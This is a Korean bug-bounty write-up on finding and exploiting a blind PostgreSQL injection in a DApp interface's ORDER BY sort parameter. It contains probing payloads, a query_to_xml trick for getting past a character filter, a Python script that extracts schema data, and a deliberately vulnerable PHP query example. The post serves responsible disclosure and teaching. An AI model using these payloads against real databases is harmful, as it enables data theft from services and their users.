---
layout: post
title:  "Blind PostgreSQL Injection in DApp Interface (Paid USD $20,000 Bounty)"
author: "munsiwoo"
comments: true
tags: [Research]
---

라온화이트햇 핵심연구2팀 문시우

# Blind PostgreSQL Injection in DApp Interface (Paid USD $20,000 Bounty)


본 글은 리얼 월드의 Web3 인터페이스에서 찾아 제보한 Critical 취약점과 익스플로잇 경험에 대한 포스팅입니다.

## Summary

DApp(Decentralized Application)은 분산형 애플리케이션으로, 블록체인 네트워크를 통해 상호작용하고 데이터를 공유할 수 있도록 하는 애플리케이션을 의미합니다. 이더리움 메인넷, 바이낸스 스마트 체인(BSC) 등 메이저한 생태계를 포함해 다양한 네트워크가 존재합니다.

이더리움과 같이 스마트 계약(Smart Contract)을 지원하는 네트워크에 솔리디티, 바이퍼 등의 프로그래밍 언어를 활용해 컨트랙트를 개발하여 올린 다음 기존의 웹 사이트에 연결해 상호작용하여 동작하는 것이 일반적입니다. 웹 사이트 없이 컨트랙트 단독으로 사용할 순 있지만 사용자의 편의를 위해 기존 웹 사이트와 연동하여 주로 사용합니다. 이러한 웹 사이트를 Web3UI, DApp 인터페이스라고 하며 DApp과 상호작용할 수 있는 새로운 구성 요소를 갖추고 있어야 합니다. (web3.js 등)

이것은 기존 웹 사이트에서 발생했던 취약점 역시 동일하게 발생할 수 있다는 것을 의미합니다. 한가지 재밌는 사실은 기존 웹 사이트에서의 XSS는 주로 쿠키 탈취 및 악성 사이트로 리다이렉션 용도로 사용되었기에(다른 취약점과 연계하는 경우는 예외) 버그바운티에서도 Server-side 취약점에 비해 Client-side 취약점은 파급력과 영향력을 낮게 책정했다면, DApp 인터페이스에서는 Client-side 취약점 또한 높게 책정합니다.

이유는 대부분의 DApp은 Metamask나 Liquality와 같은 브라우저 지갑과 연동해 사용할뿐더러, XSS로 웹사이트의 구성을 변경할 수 있다면 상호작용하는 DApp의 컨트랙트 주소를 변경하거나 임의의 트랜잭션을 요청하는 등 취약점 활용도와 영향력이 커졌기 때문에 Client-side 취약점 또한 Critical 군에 들어가는 경우가 많아졌습니다.

그럼 Server-side 취약점의 파급력이 낮아졌냐 하면, 그건 또 아닙니다. DB를 사용하고 있는 곳이라면 유저의 Private API Key나 계정을 훔칠 수 있고 RCE가 가능하다면 페이지 구성 또는 설정 자체를 변경해버릴 수 있으니 더 치명적일 겁니다.

이 글에선 실제 운영중인 DApp 인터페이스에서 찾아 제보한 Server-side 취약점(SQL Injection)과 **K-CTF급** 익스플로잇 경험을 다룹니다.

## Find Vulnerability

지난 1년간 솔리디티로 작성된 컨트랙트를 포함하여, 이러한 컨트랙트와 연동된 인터페이스를 중점으로 버그 헌팅을 해왔습니다. 다양한 타겟을 보며 느낀점은 대부분이 비슷한 스펙으로 배포한다는 것인데요, 주로 Nextjs(12~13) + Vercel 조합의 서버리스(Server-less) 형태로 많이 배포하는 것을 확인하였습니다.

이렇게 배포된 웹은 대부분 구조가 단순했으며 컨트랙트와 상호작용하는 것 외에는 기능이 거의 없었기에, 취약점이 발생하는 스팟(꿀밭)이 한정되어 있다고 생각했습니다. (대부분 webpack과 같은 번들러를 거쳐 나오기에 분석도 쉽지 않습니다)

React 버전을 체크하여 원데이(1-DAY)를 정리해주는 스크립트는 작성해서 쭉 돌려보았지만, 큰 수확은 없었습니다. 여기서 제가 선택한 길은 흔하지 않은 스펙을 가진 인터페이스를 먼저 보는 것이었는데요. 먼저 모든 사이트를 돌아다니며 사이트별로 기술 스택을 정리/분류한 뒤, 엄격하게 선별한 사이트만 BurpSuite를 실행한 다음 취약점을 찾아 나섰습니다.

이것은 나름 현명한 선택이었습니다. 수많은 K-CTF 문제와 버그 헌팅을 통해 개안한 취약점 사륜안이 빛을 발했다고도 볼 수 있는데요. (vendor 이름은 나중에 허락하면 공개하도록 하겠습니다)

```json
{
	"status":"online",
	"page":1,
	"sort":"tokenId",
	"order":"desc"
	"id":1
}
```

위 JSON에서 weak spot을 찾으셨나요?

물론 다른 파라미터도 취약할 순 있지만, 특히 `sort`와 `order` 파라미터가 굉장히 수상합니다. 경험상 일반적으로 prepared statement에서 데이터의 값을 비교 할 땐 바인딩을 `?`나 `%s` 키워드로 처리한다고 해도, ORDER BY절에 들어가는 컬럼 이름이나 차순(ASC/DESC)을 설정할 때 똑같이 `?`나 `%s`로 바인딩 하게된다면 쿼터로 감싸진 string으로 인식하기 때문에 개발자는 SQL Syntax Error를 맞이하게 됩니다. 여기서 대처 방법에 따라 시큐어코딩에 능숙한 개발자와 미숙한 개발자로 나뉩니다.

시큐어코딩에 능숙한 개발자는 Whitelist를 지정하여 사용자 입력을 검사하거나 언어에서 지원하는 Built-in 기능을 통해 안전하게 구현하는 반면, string concat으로 사용자 입력을 query에 그대로 넣는 미숙한 개발자가 있습니다.

**미숙한 개발자가 작성한 코드 예시:**

```php
$sql = "SELECT * FROM table FROM id=? ORDER BY ${sort} ${order}";
```

제가 보았던 DApp 인터페이스 개발자는 어떻게 처리했을까요?
먼저, 컬럼 이름이 들어가는 곳에 숫자를 넣어 1씩 증가시켜보았습니다.

```
"sort":"1" --> Normal response
"sort":"2" --> Normal response
"sort":"3" --> Normal response
...
"sort":"16" --> Normal response
"sort":"17" --> Unusual response with the message "Data not found"
```

16까지는 정상적인 응답을 하다가 17에서 기존과 다른 응답이 오는 것을 확인할 수 있습니다. 여기부터 1차 행복회로를 돌려도 되겠습니다. 모든 DB가 그렇진 않지만, 대부분의 관계형 DB는 ORDER BY에서 컬럼명 대신 컬럼의 순서를 숫자로 넣어줄 수 있습니다.

`ORDER BY 3 DESC`이렇게 하면 "세번째 컬럼을 기준으로 내림차순 정렬하겠다" 라는 의미입니다. 여기서 만약 숫자가 컬럼의 개수를 초과하면 SQL Error가 발생하게 됩니다.

여기에서 2차 행복회로를 돌리기 위해, 다양한 SQL 문법을 활용하여 SQL Injection 취약점인지 확인해보았습니다. 체크하는 방법은 많겠지만, 저는 주석처리(comment)와 괄호, 함수 등 다양한 방법을 활용해 취약점 유무와 DB 종류를 체크하였습니다.

```
"sort":"(tokenId)" --> Normal response
"sort":"tokenId)" --> Error

"sort":"tokenId/*AAAAAA*/" --> Normal response
"sort":"tokenId/**/AAAAAA" --> Error

"sort":"(/*B*/tokenId/*AAAAAA*/)/*B*/" --> Normal response
"sort":"(/*B*/ABCD/*AAAAAA*/)/*B*/" --> Error (ABCD컬럼이 없어서 오류가 나는것으로 추측)
```

괄호와 주석이 잘 작동하는 것 같습니다.

```
"sort":"(SELECT(CHR(100)))"  --> Normal response
"sort":"(SELECT(SUBSTR('a',1,1)))" --> Normal response
"sort":"(SELECT(VERSION()))" --> Normal response
"sort":"(SELECT/**/current_user)" --> Normal response
"sort":"(SELECT(ABCD('a',1,1)))" --> Error
```

위의 응답 결과를 통해 SQL Injection이 발생하는구나 확신했으며, 다음의 query로 DB 종류를 알아낼 수 있었습니다.

```
"sort":"(SELECT(getpgusername()))" --> Normal response
"sort":"(SELECT(a()))" --> Error
```

PostgreSQL에만 존재하는 `getpgusername`함수가 정상적으로 응답하는 것을 보아 타겟은 PostgreSQL을 사용중인 것을 알 수 있습니다.

## Exploitation

취약점을 제보하기 위해서는, 원하는 데이터를 추출할 수 있는지 증명하기 위한 PoC 코드를 작성해야 합니다. ORDER BY절에서 발생한 SQL Injection이므로 비교하는 값이 참일 때와 거짓일 때를 기준으로 정렬되어 오는 응답이 다르다는 점을 이용해 Blind SQL Injection을 수행했습니다. 다음은 current_user를 가져오기 위한 페이로드입니다. (자동화 스크립트는 뒤에 첨부)

```
"sort": "id=(1+(SELECT\\nCASE\\nWHEN\\n((SELECT\\ncurrent_user)LIKE'{}%')\\nTHEN\\n1\\nELSE\\n0\\nEND))"
```

**스크립트 실행결과:**

```
extracted value: █
extracted value: ██
extracted value: ███
...
extracted value: ██████
```

이제 실제 유저 테이블에 접근하여 정보를 추출할 수 있는 PoC를 작성해야 합니다. (이 부분은 개인정보와 관련된 부분이기에 vendor와 충분히 소통하였으며 vendor의 요청 및 허락이 있었습니다)

PostgreSQL또한 MySQL과 마찬가지로 `information_schema` DB에 모든 스키마 정보가 저장되어 있기에 해당 DB에 접근하기 위해서는 `.`사용이 불가피합니다. (`information_schema.columns` 등)

여기서 한가지 문제점은 `sort`파라미터로 `.` 문자와 whitespace를 사용할 수 없다는 애로사항이 있었는데요. Lord of SQL Injection 워게임을 통해 단련된 저에게 이것은 더 이상 애로사항이 아니었습니다. (Shout out Rubiya)

PostgreSQL에는 `query_to_xml`이라는 좋은 기능을 제공합니다. 첫번째 인자로 query를 전달하면 해당 query를 실행한 결과를 xml로 반환해주는 함수입니다.

**Query:**

```
SELECT query_to_xml('SELECT VERSION()',true,true,'');
```

**결과:**

```
<row xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"><version>PostgreSQL 10.21 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-23), 64-bit</version> </row>
```

이렇게 첫번째 인자를 string으로 받기 때문에 `CHR`함수와 string concat(`||`)을 적절하게 활용하여 `.`을 사용할 수 있었습니다.

```
SELECT xmlserialize(document(query_to_xml('SELECT/**/'''||CHR(46)||'''/**/AS/**/x',true,true,'')) AS text);
```

이제 `information_schema.columns`에서 스키마 정보를 모조리 뽑아올 모든 준비가 완료되었습니다.

**Payload:**

```
"sort":"id=(1+(SELECT\\nCASE\\nWHEN\\n((xmlserialize(document(query_to_xml('SELECT/**/(column_name)x/**/FROM/**/information_schema'||CHR(46)||'columns/**/LIMIT/**/1/**/OFFSET/**/1',true,true,''))\\nAS\\ntext))LIKE'%<x>{}%')\\nTHEN\\n1\\nELSE\\n0\\nEND))"
```

**Exploit(Python):**

```python
import requests
import json
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

url = "██████████████████████████████"
jwt = "██████████████████████████████"

headers = {
    "Host": "███████████████",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {jwt}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Origin": "█████████████████████",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,ko;q=0.8,zh;q=0.7,zh-CN;q=0.6,la;q=0.5,und;q=0.4,lb;q=0.3,vi;q=0.2",
    "Connection": "close"
}
data = {
    "parameters": [{
        "status":0,
        "page":1,
        "sort":":INJECT POINT:",
        "order":"desc"
        "id":1
    }],
}
payload = "id=(1+(SELECT CASE WHEN ((xmlserialize(document(query_to_xml('SELECT/**/(column_name)x/**/FROM/**/information_schema'||CHR(46)||'columns/**/LIMIT/**/1/**/OFFSET/**/1',true,true,'')) AS text))LIKE'%<x>{}%') THEN 1 ELSE 0 END))".replace(' ', '\\n')
result = ""

for i in range(100):
    for s in '123456789abcdefghijklmnopqrstuvwxyz:_':
        data['parameters'][0]['sort'] = payload.format(result + s)
        json_data = json.dumps(data)
        response = json.loads(requests.post(url, headers=headers, data=json_data, verify=False).text)

        if response['id'] == 55:
            result += s
            break

    print('extracted value: ', result)
```

이렇게 `information_schema`에 접근하여 테이블 정보와 컬럼 명을 추출했습니다. 위와 동일한 방법으로 유저 테이블에 접근해 데이터를 추출할 수 있었습니다.

참고로 Python에서 requests를 활용한 HTTP 요청 코드를 쉽게 작성할 수 있도록 도와주는 서비스가 있습니다. 제가 만들었지만 지인들은 요긴하게 잘 사용하고 있으니 여러분도 사용해보세요.

Python request maker: [https://withphp.com/prm/](https://withphp.com/prm/)

## Conclusion

![https://blog.munsiwoo.kr/wp-content/uploads/2023/03/1.png](https://blog.munsiwoo.kr/wp-content/uploads/2023/03/1.png)

이렇게 리얼 월드에서 Blind SQL Injection을 통해 바운티를 얻기까지 여정에 대해 주저리 적어보았습니다. 거의 2년만의 포스팅이라 또 언제 돌아올진 모르겠지만 다음 포스팅에선 Nextjs + Vercel 조합에서 발견했던 Critical 취약점 케이스에 대해서 다뤄보겠습니다.

여담으로 고등학생 시절부터 같이 CTF를 해오던 친구들과 함께 흥부(Heung)라는 DApp에 특화된 버그바운티 팀을 꾸려 열심히 버그바운티 활동을 하고 있습니다. 다양한 취약점을 찾아 제보하고 버그 케이스를 공유하며 서로 윈윈하고 있는데 나중엔 소규모의 버그 바운티 세미나도 열어볼까 하는데 잘 될진 모르겠네요. 이렇게 취약점에 대해 직접 포스팅하는건 처음이지만 팀원 중 howdays군이 찾아낸 Critical 취약점 몇가지 더 첨부하고 끝내겠습니다. 긴 글 읽어주셔서 감사합니다.

Bitcoin Cash의 사이드체인 SmartBCH에서 발견한 Critical 취약점: [https://smartbch.medium.com/a-whitehat-hacker-protects-smartbch-by-reporting-a-vulnerability-d2c8a5d91732](https://smartbch.medium.com/a-whitehat-hacker-protects-smartbch-by-reporting-a-vulnerability-d2c8a5d91732)

Livepeer Network에서 발견한 Critical 취약점: [https://forum.livepeer.org/t/post-mortem-8-24-22-delegated-stake-could-be-frozen/1897](https://forum.livepeer.org/t/post-mortem-8-24-22-delegated-stake-could-be-frozen/1897)

위의 게시글도 재밌으니 읽어주시면 감사하겠습니다 🙂

본 글의 원문은 [https://blog.munsiwoo.kr/2023/03/blind-postgresql-injection-in-dapp-interface-20000-bounty/](https://blog.munsiwoo.kr/2023/03/blind-postgresql-injection-in-dapp-interface-20000-bounty/) 에서 확인하실 수 있습니다.
